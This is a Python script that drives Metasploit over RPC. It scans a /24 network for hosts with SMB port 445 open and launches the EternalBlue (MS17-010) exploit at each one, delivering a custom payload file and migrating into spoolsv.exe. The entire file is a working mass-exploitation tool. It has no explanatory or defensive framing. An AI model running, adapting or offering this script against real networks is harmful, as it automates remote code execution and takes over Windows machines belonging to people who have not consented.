from pymetasploit3.msfrpc import MsfRpcClient
import ipaddress
import socket


class EternalBlue:
    def __init__(self, metapass, lista, payload):
        self.meta = metapass
        self.list = []
        self.range = lista
        self.bin = payload
        
    def host_up(self, ip):
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.settimeout(0.3)
            connection.connect((ip, 445))
            connection.shutdown(socket.SHUT_RDWR)
            self.list.append(ip)
        except socket.timeout:
            pass
        except socket.error:
            pass
        connection.close()

    def load(self):
        listado = [str(ip) for ip in ipaddress.IPv4Network(str(self.range))]
        for i in listado:
            self.host_up(i)
        print(self.list)

    def main(self):
        self.load()
        client = MsfRpcClient(self.meta, ssl=True)
        exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
        exploit['RPORT'] = 445
        exploit['CheckModule'] = 'auxiliary/scanner/smb/smb_ms17_010'
        payload = client.modules.use('payload', 'generic/custom')
        payload.runoptions['PAYLOADFILE'] = self.bin
        exploit['MaxExploitAttempts'] = 1
        exploit['ProcessName'] = 'spoolsv.exe'
        cid = client.consoles.console().cid
        for line in self.list:
            exploit['RHOSTS'] = line
#            exploit.execute(payload=payload)
            result = client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
            print(result)
            

if __name__ == '__main__':
    start = EternalBlue('yourpassword', '192.168.3.0/24', 'payload.bin')
    start.main()
